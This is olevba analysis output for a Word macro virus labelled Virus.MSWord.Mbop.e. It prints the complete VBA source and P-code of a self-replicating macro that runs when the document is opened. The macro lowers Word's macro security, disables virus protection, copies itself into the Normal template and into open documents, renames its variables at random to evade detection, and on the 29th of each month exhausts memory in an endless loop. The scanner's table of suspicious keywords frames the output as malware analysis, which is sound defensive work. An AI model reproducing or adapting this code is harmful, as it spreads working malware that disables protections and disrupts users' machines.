olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSWord.Mbop.e - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
mbophhmbop = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
mbopfimbop = 1
Options.ConfirmConversions = False
Set mbopNtmbop = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
mbop11mbop = 1
Set mbopAdmbop = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
mbopsembop = 3
Set mbopTdmbop = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
mboptrmbop = 3
mbopfnmbop = mbopfimbop & mbopsembop & mboptrmbop
For mbopiimbop = 1 To mbopTdmbop.countoflines
If InStr(mbopTdmbop.lines(mbopiimbop, 1), "Private Sub Document_Open()") <> 0 Then
mbopSlmbop = mbopiimbop
Exit For
End If
Next
mbopVcmbop = Trim(mbopTdmbop.lines(mbopSlmbop, mbopSlmbop + mbopfnmbop))
mboplvmbop = 97
mbop15mbop = 15
If mbopNtmbop.countoflines > 0 Then
mbopNlmbop = mbopNtmbop.lines(1, mbopNtmbop.countoflines)
If InStr(mbopNlmbop, "Nt") = 0 And InStr(mbopNlmbop, "Sl") = 0 And InStr(mbopNlmbop, "Nl") = 0 And InStr(mbopNlmbop, "Ad") = 0 And InStr(mbopNlmbop, "Vc") = 0 And InStr(mbopNlmbop, "Td") = 0 Then
If InStr(LCase(mbopNlmbop), "private sub document_open()") <> 0 Then
For mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopNlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, 1
End If
mbopNtmbop.addfromstring mbopVcmbop
mbopNtmbop.Save
mbopinmbop = mbophhmbop
End If
Else
mbopNtmbop.addfromstring mbopVcmbop
mbopNtmbop.Save
mbopinmbop = mbophhmbop
End If
mbophvmbop = 122
mbopimbop = 1
mbopdqmbop = Documents.Count
If mbopAdmbop.countoflines > 0 Then
mbopAlmbop = mbopAdmbop.lines(1, mbopAdmbop.countoflines)
If InStr(mbopAlmbop, "Nt") = 0 And InStr(mbopAlmbop, "Sl") = 0 And InStr(mbopAlmbop, "Nl") = 0 And InStr(mbopAlmbop, "Ad") = 0 And InStr(mbopAlmbop, "Vc") = 0 And InStr(mbopAlmbop, "Td") = 0 Then
If InStr(LCase(mbopAlmbop), "private sub document_open()") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopAlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, 1
End If
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = mbophhmbop
End If
Else
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = mbophhmbop
End If
Randomize
mbop15mbop = Int((mbop15mbop - mbop11mbop + mbop11mbop) * Rnd + mbop11mbop)
For mbopiimbop = 1 To mbop15mbop
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((mbophvmbop - mboplvmbop + 1) * Rnd + mboplvmbop))
Next
mbopd2mbop = 9
mbopVcmbop = mbopTdmbop.lines(1, mbopTdmbop.countoflines)
mbopTdmbop.deletelines 1, mbopTdmbop.countoflines
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
mbopTdmbop.addfromstring mbopVcmbop
mbopdymbop = Day(Now)
mbopd1mbop = 2
If mbopdymbop = mbopd1mbop & mbopd2mbop Then
Dim mbopstmbop()
mbopcambop = 0
Do
ReDim Preserve mbopstmbop(mbopcambop)
mbopqwmbop = CLng(1024)
mbopqambop = mbopqwmbop
mbopqzmbop = mbopqwmbop * mbopqambop
mbopstmbop(mbopcambop) = String(mbopqzmbop, Right(mbopTnmbop, 1))
DoEvents
mbopcambop = mbopcambop + 1
Loop
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mbop.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Módulo1 - 6467 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0001 
' 	St mbophhmbop 
' Line #3:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	LitDI2 0x0001 
' 	St mbopfimbop 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopNtmbop 
' Line #9:
' 	LitDI2 0x0001 
' 	St mbop11mbop 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopAdmbop 
' Line #11:
' 	LitDI2 0x0003 
' 	St mbopsembop 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopTdmbop 
' Line #13:
' 	LitDI2 0x0003 
' 	St mboptrmbop 
' Line #14:
' 	Ld mbopfimbop 
' 	Ld mbopsembop 
' 	Concat 
' 	Ld mboptrmbop 
' 	Concat 
' 	St mbopfnmbop 
' Line #15:
' 	StartForVariable 
' 	Ld mbopiimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	For 
' Line #16:
' 	Ld mbopiimbop 
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld mbopiimbop 
' 	St mbopSlmbop 
' Line #18:
' 	ExitFor 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	Ld mbopSlmbop 
' 	Ld mbopSlmbop 
' 	Ld mbopfnmbop 
' 	Add 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St mbopVcmbop 
' Line #22:
' 	LitDI2 0x0061 
' 	St mboplvmbop 
' Line #23:
' 	LitDI2 0x000F 
' 	St mbop15mbop 
' Line #24:
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopNlmbop 
' Line #26:
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #27:
' 	Ld mbopNlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #29:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #31:
' 	ExitFor 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Next 
' Line #34:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	Ld mbopnsmbop 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #35:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #36:
' 	Ld mbopimbop 
' 	St mbopnembop 
' Line #37:
' 	ExitFor 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Next 
' Line #40:
' 	Ld mbopnsmbop 
' 	Ld mbopnembop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld mbopNlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #44:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #45:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #46:
' 	ExitFor 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' 	Ld mbopnsmbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld mbopVcmbop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #52:
' 	Ld mbopNtmbop 
' 	ArgsMemCall Save 0x0000 
' Line #53:
' 	Ld mbophhmbop 
' 	St mbopinmbop 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	Ld mbopVcmbop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #57:
' 	Ld mbopNtmbop 
' 	ArgsMemCall Save 0x0000 
' Line #58:
' 	Ld mbophhmbop 
' 	St mbopinmbop 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	LitDI2 0x007A 
' 	St mbophvmbop 
' Line #61:
' 	LitDI2 0x0001 
' 	St mbopimbop 
' Line #62:
' 	Ld Documents 
' 	MemLd Count 
' 	St mbopdqmbop 
' Line #63:
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopAlmbop 
' Line #65:
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #66:
' 	Ld mbopAlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #68:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #69:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #70:
' 	ExitFor 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Next 
' Line #73:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	Ld mbopnsmbop 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #74:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #75:
' 	Ld mbopimbop 
' 	St mbopnembop 
' Line #76:
' 	ExitFor 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Next 
' Line #79:
' 	Ld mbopnsmbop 
' 	Ld mbopnembop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	Ld mbopAlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #82:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #83:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #84:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #85:
' 	ExitFor 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	StartForVariable 
' 	Next 
' Line #88:
' 	Ld mbopnsmbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Ld mbopVcmbop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #91:
' 	Ld mbophhmbop 
' 	St mbopiambop 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	ElseBlock 
' Line #94:
' 	Ld mbopVcmbop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #95:
' 	Ld mbophhmbop 
' 	St mbopiambop 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	ArgsCall Read 0x0000 
' Line #98:
' 	Ld mbop15mbop 
' 	Ld mbop11mbop 
' 	Sub 
' 	Ld mbop11mbop 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld mbop11mbop 
' 	Add 
' 	FnInt 
' 	St mbop15mbop 
' Line #99:
' 	StartForVariable 
' 	Ld mbopiimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbop15mbop 
' 	For 
' Line #100:
' 	ArgsCall Read 0x0000 
' Line #101:
' 	Ld mbopTnmbop 
' 	Ld mbophvmbop 
' 	Ld mboplvmbop 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld mboplvmbop 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St mbopTnmbop 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LitDI2 0x0009 
' 	St mbopd2mbop 
' Line #104:
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopVcmbop 
' Line #105:
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	Ld mbopTdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #106:
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #107:
' 	Ld mbopVcmbop 
' 	LitDI2 0x0001 
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld mbopTnmbop 
' 	Concat 
' 	Ld mbopVcmbop 
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitStr 0x0004 "mbop"
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St mbopVcmbop 
' Line #108:
' 	Loop 
' Line #109:
' 	Ld mbopVcmbop 
' 	Ld mbopTdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #110:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St mbopdymbop 
' Line #111:
' 	LitDI2 0x0002 
' 	St mbopd1mbop 
' Line #112:
' 	Ld mbopdymbop 
' 	Ld mbopd1mbop 
' 	Ld mbopd2mbop 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	Dim 
' 	VarDefn mbopstmbop
' Line #114:
' 	LitDI2 0x0000 
' 	St mbopcambop 
' Line #115:
' 	Do 
' Line #116:
' 	OptionBase 
' 	Ld mbopcambop 
' 	Redim (Preserve) mbopstmbop 0x0001 (As Variant)
' Line #117:
' 	LitDI2 0x0400 
' 	Coerce (Lng) 
' 	St mbopqwmbop 
' Line #118:
' 	Ld mbopqwmbop 
' 	St mbopqambop 
' Line #119:
' 	Ld mbopqwmbop 
' 	Ld mbopqambop 
' 	Mul 
' 	St mbopqzmbop 
' Line #120:
' 	Ld mbopqzmbop 
' 	Ld mbopTnmbop 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	ArgsLd String$ 0x0002 
' 	Ld mbopcambop 
' 	ArgsSt mbopstmbop 0x0001 
' Line #121:
' 	ArgsCall DoEvents 0x0000 
' Line #122:
' 	Ld mbopcambop 
' 	LitDI2 0x0001 
' 	Add 
' 	St mbopcambop 
' Line #123:
' 	Loop 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

